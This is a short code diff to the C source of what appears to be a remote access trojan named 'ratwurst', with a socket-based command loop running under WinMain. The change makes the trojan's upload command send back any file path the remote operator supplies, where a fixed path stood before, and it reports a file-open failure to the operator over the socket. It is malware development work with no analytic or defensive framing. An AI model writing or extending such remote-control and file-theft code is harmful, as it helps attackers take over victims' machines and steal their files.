@@ -81,7 +81,7 @@ int SocketUploadFile(RATSocket* ratSocket, char* filePath)
 	else
 	{
 		OutputDebugString("[ERROR] Error opening file.\n");
-		fclose(fs);
+		SocketSend(ratSocket, "0", 1);
 		return 1;
 	}
 }
@@ -282,7 +282,7 @@ WinMain(HINSTANCE hInstance,
 		}
 		else if ( strcmp(splittedCommand[0], ca_upload) == 0 )
 		{
-			SocketUploadFile(&ratSocket, "x:\\build\\ratwurst.exe");
+			SocketUploadFile(&ratSocket, splittedCommand[1]);
 		}
 		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
 		{
